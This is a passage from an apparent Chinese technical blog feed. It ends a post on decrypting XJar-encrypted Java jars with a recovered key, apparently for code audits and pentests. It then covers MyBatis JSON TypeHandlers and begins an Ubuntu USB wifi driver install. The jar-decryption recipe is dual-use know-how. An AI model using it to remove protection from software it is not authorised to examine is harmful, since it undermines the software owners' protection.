同时使用时即解密在include的范围内且排除了exclude的资源。</li><li>如果解密以后发现文件仍然无法打开，确定密钥是否正确，确定文件是否被排除在外，或者文件是否被加密。</li></ul><h2 id="使用密钥进行解密"><a href="#使用密钥进行解密" class="headerlink" title="使用密钥进行解密"></a>使用密钥进行解密</h2><p>目前，XJAR内置AES&#x2F;CBC&#x2F;PKCS5Padding 和 DES&#x2F;CBC&#x2F;PKCS5Padding两种算法，如果获取的是密钥，而不是密码，相关解密的代码应该进行调整，参考代码如下：</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-keyword">import</span> <span class="hljs-variable">io</span>.<span class="hljs-property">xjar</span>.<span class="hljs-property">XCryptos</span>;<br><span class="hljs-keyword">import</span> <span class="hljs-variable">io</span>.<span class="hljs-property">xjar</span>.<span class="hljs-property">XKit</span>;<br><span class="hljs-keyword">import</span> <span class="hljs-variable">io</span>.<span class="hljs-property">xjar</span>.<span class="hljs-property">key</span>.<span class="hljs-property">XKey</span>;<br><br><span class="hljs-keyword">import</span> <span class="hljs-variable">java</span>.<span class="hljs-property">nio</span>.<span class="hljs-property">charset</span>.<span class="hljs-property">StandardCharsets</span>;<br><br><span class="hljs-variable">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EcryptXjar</span> &#123;<br>    <span class="hljs-variable">public</span> <span class="hljs-keyword">static</span> <span class="hljs-variable">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-title class_">String</span>[] <span class="hljs-variable">args</span>) <span class="hljs-variable">throws</span> <span class="hljs-title class_">Exception</span> &#123;<br>        <span class="hljs-title class_">String</span> <span class="hljs-variable">algorithm</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;AES/CBC/PKCS5Padding&quot;</span>;<br>        <span class="hljs-title class_">Integer</span> <span class="hljs-variable">keysize</span> <span class="hljs-operator">=</span> <span class="hljs-number">128</span>;<br>        <span class="hljs-title class_">Integer</span> <span class="hljs-variable">ivsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">128</span>;<br>        <span class="hljs-title class_">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;temp&quot;</span>;<br>        <span class="hljs-title class_">String</span> <span class="hljs-variable">jarpath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;E:<span class="hljs-char escape_">\\</span>pentest<span class="hljs-char escape_">\\</span>xjarTest<span class="hljs-char escape_">\\</span>src<span class="hljs-char escape_">\\</span>main<span class="hljs-char escape_">\\</span>resources<span class="hljs-char escape_">\\</span>web.jar&quot;</span>;<br>        <span class="hljs-title class_">String</span> <span class="hljs-variable">decryptJarpath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;E:<span class="hljs-char escape_">\\</span>pentest<span class="hljs-char escape_">\\</span>xjarTest<span class="hljs-char escape_">\\</span>src<span class="hljs-char escape_">\\</span>main<span class="hljs-char escape_">\\</span>resources<span class="hljs-char escape_">\\</span>web.jar&quot;</span>;<br>        <span class="hljs-title class_">XCryptos</span>.<span class="hljs-property">decryption</span>()<br>                .<span class="hljs-property">from</span>(<span class="hljs-variable">jarpath</span>)<br>                .<span class="hljs-property">use</span>(<span class="hljs-variable">algorithm</span>,<span class="hljs-variable">keysize</span>,<span class="hljs-variable">ivsize</span>,<span class="hljs-variable">password</span>)<br>                .<span class="hljs-property">include</span>(<span class="hljs-string">&quot;/io/xjar/**/*.class&quot;</span>)<br>                .<span class="hljs-property">include</span>(<span class="hljs-string">&quot;/mapper/**/*Mapper.xml&quot;</span>)<br>                .<span class="hljs-property">exclude</span>(<span class="hljs-string">&quot;/static/**/*&quot;</span>)<br>                .<span class="hljs-property">exclude</span>(<span class="hljs-string">&quot;/conf/*&quot;</span>)<br>                .<span class="hljs-property">to</span>(<span class="hljs-variable">decryptJarpath</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>其中算法，密钥长度，偏移量的长度根据实际情况进行填写即可。</li></ul><h2 id="使用xjar加密项目"><a href="#使用xjar加密项目" class="headerlink" title="使用xjar加密项目"></a>使用xjar加密项目</h2><p>这个参考github上的介绍即可，我这里直接使用maven进行打包。比如以下命令：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">mvn xjar:<span class="hljs-keyword">build</span> -Dxjar.<span class="hljs-keyword">password</span>=io.xjar<br></code></pre></td></tr></table></figure><p>如果在pom.xml build中引入xjar的插件，配置完成，直接使用 <code> maven clean build</code> 构建项目即可，官方不推荐这种方式，容易泄露打包密码，各位同学根据实际情况食用即可。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://github.com/core-lib/xjar">https://github.com/core-lib/xjar</a>【xjar github】</li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Code Audit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mybatis中typeHandler自定义实现typeHandler与数据库映射JSON读取</title>
    <link href="/2021/11/23/2021-11-23-store-json-data-in-mybatis/"/>
    <url>/2021/11/23/2021-11-23-store-json-data-in-mybatis/</url>
    
    <content type="html"><![CDATA[<p>mybatis中typeHandler自定义实现typeHandler与数据库映射JSON读取</p><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>mysql从5.7.版本开始支持json列，但是本质上仍然存储的是一个字符串，比起直接用varchar来说，它有专门对于json的的检索方式和修改方法。<br>在jdbc规范中，还没json类型的定义。所以对象一般都是用String属性，映射数据库的json列。在存储和读取的时候，需要自己完成json的序列化和反序列化。<br>在使用MyBatis的框架，可以通过定义TypeHandler来自动完成Json属性的序列化和反序列化。</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>mybatis-spring-boot-starter:1.3.2<br>mysql:5.7.35<br>org.json:20210307</p><h2 id="自定义-typeHandler-实现json从数据库中读取"><a href="#自定义-typeHandler-实现json从数据库中读取" class="headerlink" title="自定义 typeHandler 实现json从数据库中读取"></a>自定义 typeHandler 实现json从数据库中读取</h2><p>将 mysql 中 json 格式的数据与 mybais 转化</p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><h4 id="1、继承BaseTypeHandler类"><a href="#1、继承BaseTypeHandler类" class="headerlink" title="1、继承BaseTypeHandler类"></a>1、继承BaseTypeHandler类</h4><p>BaseTypeHandler有四个方法，分别是：</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setNonNullParameter</span><span class="hljs-params">(PreparedStatement preparedStatement, <span class="hljs-keyword">int</span> i, Object o, JdbcType jdbcType)</span> <span class="hljs-keyword">throws</span> SQLException </span>&#123;<br><br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-function">Object <span class="hljs-title">getNullableResult</span><span class="hljs-params">(ResultSet resultSet, String s)</span> <span class="hljs-keyword">throws</span> SQLException </span>&#123;<br>       <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-function">Object <span class="hljs-title">getNullableResult</span><span class="hljs-params">(ResultSet resultSet, <span class="hljs-keyword">int</span> i)</span> <span class="hljs-keyword">throws</span> SQLException </span>&#123;<br>       <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-function">Object <span class="hljs-title">getNullableResult</span><span class="hljs-params">(CallableStatement callableStatement, <span class="hljs-keyword">int</span> i)</span> <span class="hljs-keyword">throws</span> SQLException </span>&#123;<br>       <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>   &#125;<br></code></pre></td></tr></table></figure><p>我这里重写了JsonArrayHandler和JsonObjectHandler两个对象。</p><p>JsonArrayHandler.java示例：     </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.blingsec.engine.utils;<br><br><span class="hljs-keyword">import</span> org.apache.ibatis.type.BaseTypeHandler;<br><span class="hljs-keyword">import</span> org.apache.ibatis.type.JdbcType;<br><span class="hljs-keyword">import</span> org.json.JSONArray;<br><span class="hljs-keyword">import</span> org.json.JSONException;<br><br><span class="hljs-keyword">import</span> java.sql.CallableStatement;<br><span class="hljs-keyword">import</span> java.sql.PreparedStatement;<br><span class="hljs-keyword">import</span> java.sql.ResultSet;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JsonArrayHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseTypeHandler</span>&lt;JSONArray&gt; &#123;<br><br>    <span class="hljs-keyword">public</span> JSONArray <span class="hljs-title function_">delResult</span><span class="hljs-params">(String jsonSource)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-keyword">if</span> (jsonSource != <span class="hljs-literal">null</span>) &#123;<br>            JSONArray jsonArray;<br>            <span class="hljs-keyword">try</span> &#123;<br>                jsonArray = <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>(jsonSource);<br>            &#125; <span class="hljs-keyword">catch</span> (JSONException ex) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SQLException</span>(<span class="hljs-string">&quot;There is an error converting JSONArray to json format for the content:&quot;</span> + jsonSource);<br>            &#125;<br>            <span class="hljs-keyword">return</span> jsonArray;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setNonNullParameter</span><span class="hljs-params">(PreparedStatement ps,</span><br><span class="hljs-params">                                    <span class="hljs-type">int</span> i,</span><br><span class="hljs-params">                                    JSONArray parameter, //需要转换的类型,JSON类型</span><br><span class="hljs-params">                                    JdbcType jdbcType)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        ps.setString(i, parameter.toString());<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> JSONArray <span class="hljs-title function_">getNullableResult</span><span class="hljs-params">(ResultSet rs, String columnName)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-keyword">return</span> delResult(rs.getString(columnName));<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> JSONArray <span class="hljs-title function_">getNullableResult</span><span class="hljs-params">(ResultSet rs, <span class="hljs-type">int</span> columnIndex)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-keyword">return</span> delResult(rs.getString(columnIndex));<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> JSONArray <span class="hljs-title function_">getNullableResult</span><span class="hljs-params">(CallableStatement cs, <span class="hljs-type">int</span> columnIndex)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-keyword">return</span> delResult(cs.getString(columnIndex));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>JsonObjectHandler.java 示例：   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.blingsec.engine.utils;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;<br><span class="hljs-keyword">import</span> org.apache.ibatis.type.BaseTypeHandler;<br><span class="hljs-keyword">import</span> org.apache.ibatis.type.JdbcType;<br><br><span class="hljs-keyword">import</span> java.sql.CallableStatement;<br><span class="hljs-keyword">import</span> java.sql.PreparedStatement;<br><span class="hljs-keyword">import</span> java.sql.ResultSet;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JsonTypeHandler</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Object</span>&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseTypeHandler</span>&lt;T&gt; &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">mapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectMapper</span>();<br>    <span class="hljs-keyword">private</span> Class&lt;T&gt; clazz;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">JsonTypeHandler</span><span class="hljs-params">(Class&lt;T&gt; clazz)</span> &#123;<br>        <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Type argument cannot be null&quot;</span>);<br>        <span class="hljs-built_in">this</span>.clazz = clazz;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setNonNullParameter</span><span class="hljs-params">(PreparedStatement preparedStatement, <span class="hljs-type">int</span> i, T t, JdbcType jdbcType)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        preparedStatement.setString(i, <span class="hljs-built_in">this</span>.toJson(t));<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> T <span class="hljs-title function_">getNullableResult</span><span class="hljs-params">(ResultSet resultSet, String s)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.toObject(resultSet.getString(s), clazz);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> T <span class="hljs-title function_">getNullableResult</span><span class="hljs-params">(ResultSet rs, <span class="hljs-type">int</span> columnIndex)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.toObject(rs.getString(columnIndex), clazz);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> T <span class="hljs-title function_">getNullableResult</span><span class="hljs-params">(CallableStatement callableStatement, <span class="hljs-type">int</span> i)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.toObject(callableStatement.getString(i), clazz);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">toJson</span><span class="hljs-params">(T object)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">return</span> mapper.writeValueAsString(object);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">private</span> T <span class="hljs-title function_">toObject</span><span class="hljs-params">(String content, Class&lt;?&gt; clazz)</span> &#123;<br>        <span class="hljs-keyword">if</span> (content != <span class="hljs-literal">null</span> &amp;&amp; !content.isEmpty()) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">return</span> (T) mapper.readValue(content, clazz);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2、配置"><a href="#2、配置" class="headerlink" title="2、配置"></a>2、配置</h4><p>重写TypeHandler这四个方法,在配置文件中需要自行配置，我在application.properties中配置，也可以在spring-mybatis.xml (数据源配置的文件)中配置。<br>application.properties相关配置如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">mybatis.type-handlers-package=cn<span class="hljs-selector-class">.blingsec</span><span class="hljs-selector-class">.engine</span><span class="hljs-selector-class">.utils</span><span class="hljs-selector-class">.JsonArrayHandler</span>,cn<span class="hljs-selector-class">.blingsec</span><span class="hljs-selector-class">.engine</span><span class="hljs-selector-class">.utils</span>.JsonObjectHandler<br></code></pre></td></tr></table></figure><blockquote><p>spring-mybatis.xml配置可以参考以下内容，来源：<a href="https://www.cnblogs.com/han-guang-xue/p/12832074.html">https://www.cnblogs.com/han-guang-xue/p/12832074.html</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;sqlSessionFactory&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;</span>&gt;</span><br>   <span class="hljs-comment">&lt;!-- 数据源配置 --&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;dataSource&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;dataSource&quot;</span> /&gt;</span><br>   <span class="hljs-comment">&lt;!-- 自动扫描mapping.xml文件 --&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;mapperLocations&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;classpath:mapper/*/*.xml&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br>   <span class="hljs-comment">&lt;!-- 加入自定义typeHandler --&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;typeHandlers&quot;</span>&gt;</span><br>   <span class="hljs-comment">&lt;!-- 示例加入多个 typeHandler --&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.xingshu.utils.typehandler.JSONArrayHandler&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.xingshu.utils.typehandler.JSONObjectHandler&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br>       <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br>&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br></code></pre></td></tr></table></figure></blockquote><h4 id="3、mapper-xml文件中配置"><a href="#3、mapper-xml文件中配置" class="headerlink" title="3、mapper xml文件中配置"></a>3、mapper xml文件中配置</h4><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">insert</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;updateComponentAnalysisCache&quot;</span>&gt;</span></span><br><span class="language-xml">    INSERT INTO</span><br><span class="language-xml">    component_analysis_cache(cache_type, last_occurrence, result, target,target_host,target_type,uuid)</span><br><span class="language-xml">    VALUES</span><br><span class="language-xml">    (#</span><span class="hljs-template-variable">&#123;ComponentAnalysisCache.cacheType&#125;</span><span class="language-xml">,#</span><span class="hljs-template-variable">&#123;ComponentAnalysisCache.lastOccurrence&#125;</span><span class="language-xml">,</span><br><span class="language-xml">    #</span><span class="hljs-template-variable">&#123;ComponentAnalysisCache.result,typeHandler=cn.blingsec.engine.utils.JsonObjectHandler&#125;</span><span class="language-xml">,#</span><span class="hljs-template-variable">&#123;ComponentAnalysisCache.target&#125;</span><span class="language-xml">,</span><br><span class="language-xml">    #</span><span class="hljs-template-variable">&#123;ComponentAnalysisCache.targetHost&#125;</span><span class="language-xml">,#</span><span class="hljs-template-variable">&#123;ComponentAnalysisCache.targetType&#125;</span><span class="language-xml">,</span><br><span class="language-xml">    #</span><span class="hljs-template-variable">&#123;ComponentAnalysisCache.uuid&#125;</span><span class="language-xml">)</span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">insert</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>我这里需要存储json数据的参数是：result</p><blockquote><p>参考资料中有这样一个描述：<br>属性名后面 typeHandler 可以直接去掉, Mybatis 会自动映射,mybatis对jdbctype 和 typeHandler 会有一个优先级的匹配,如果实现类只有一个,可以省略不写<br>但是我在测试的时候会提示找不到jdbctype，报错信息，java方向实属太弱，没时间调试，留个尾巴，哪位大佬如果清楚可以沟通沟通：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Analyzing <span class="hljs-built_in">error</span> : org.mybatis.spring.MyBatisSystemException: nested exception is org.apache.ibatis.type.TypeException: Could <span class="hljs-keyword">not</span> <span class="hljs-built_in">set</span> parameters <span class="hljs-keyword">for</span> mapping: ParameterMapping&#123;<span class="hljs-attribute">property</span>=<span class="hljs-string">&#x27;ComponentAnalysisCache.result&#x27;</span>, <span class="hljs-attribute">mode</span>=IN, <span class="hljs-attribute">javaType</span>=class java.lang.Object, <span class="hljs-attribute">jdbcType</span>=<span class="hljs-literal">null</span>, <span class="hljs-attribute">numericScale</span>=<span class="hljs-literal">null</span>, <span class="hljs-attribute">resultMapId</span>=<span class="hljs-string">&#x27;null&#x27;</span>, <span class="hljs-attribute">jdbcTypeName</span>=<span class="hljs-string">&#x27;null&#x27;</span>, <span class="hljs-attribute">expression</span>=<span class="hljs-string">&#x27;null&#x27;</span>&#125;. Cause: org.apache.ibatis.type.TypeException: <span class="hljs-built_in">Error</span> setting non <span class="hljs-literal">null</span> <span class="hljs-keyword">for</span> parameter #3 with JdbcType <span class="hljs-literal">null</span> . Try setting a different JdbcType <span class="hljs-keyword">for</span> this parameter <span class="hljs-keyword">or</span> a different configuration property. Cause: org.apache.ibatis.type.TypeException: <span class="hljs-built_in">Error</span> setting non <span class="hljs-literal">null</span> <span class="hljs-keyword">for</span> parameter #3 with JdbcType <span class="hljs-literal">null</span> . Try setting a different JdbcType <span class="hljs-keyword">for</span> this parameter <span class="hljs-keyword">or</span> a different configuration property. Cause: java.sql.SQLException: Invalid argument value: java.io.NotSerializableException<br><br></code></pre></td></tr></table></figure><p>运行结果：<br><img src="/img/20211123-01.png" alt="20211123-01.png"></p></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.cnblogs.com/han-guang-xue/p/12832074.html">https://www.cnblogs.com/han-guang-xue/p/12832074.html</a>【mybatis中typeHandler自定义实现json的读写 】</li><li><a href="https://juejin.cn/post/6861845363889078286">https://juejin.cn/post/6861845363889078286</a>【MyBatis通过TypeHandler自动编解码对象的Json属性】</li><li><a href="https://segmentfault.com/a/1190000038259923">https://segmentfault.com/a/1190000038259923</a>【springboot mybatis 配置】</li></ul>]]></content>
    
    
    <categories>
      
      <category>Code</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ubuntu 安装 COMFAST CF-924AC V2 USB网卡驱动</title>
    <link href="/2021/11/15/2021-11-15-install-cf-924ac-driver-in-ubuntu/"/>
    <url>/2021/11/15/2021-11-15-install-cf-924ac-driver-in-ubuntu/</url>
    
    <content type="html"><![CDATA[<p>Ubuntu 安装 COMFAST CF-924AC V2 USB网卡驱动 </p><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>公司只有无线网络，服务器一直用一个2.4GHz的无线网卡进行访问，但是网络速度和质量有些垃圾，网上买了个USB千兆无线网卡，支持2.4GHz和5.8Ghz，在安装的过程中发现官方源中找不到相关的linux驱动，全网检索，也找不到这张网卡linux驱动，去官网查了一下，发现官方就不提供linux版本驱动，这就有点儿尴尬了。<br><img src="/img/20211115-01.jpg" alt="20211115-01.jpg"><br><img src="/img/20211115-03.jpg" alt="20211115-03.jpg"><br>ubuntu自动识别这个USB网卡为：RTL88x2bu [AC1200 Techkey]，<br><img src="/img/20211115-02.png" alt="20211115-02.png"><br>我尝试直接编译安装RTL88x2bu相关驱动模块，发现可以识别这个网卡。以下是相关安装步骤：</p><h2 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h2><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">git <span class="hljs-keyword">clone</span> <span class="hljs-title">https</span>://github.com/cilynx/rtl88x2bu<br></code></pre></td></tr></table></figure><p>编译安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">make <br><span class="hljs-built_in">sudo</span> make install<br><span class="hljs-built_in">sudo</span> modprobe 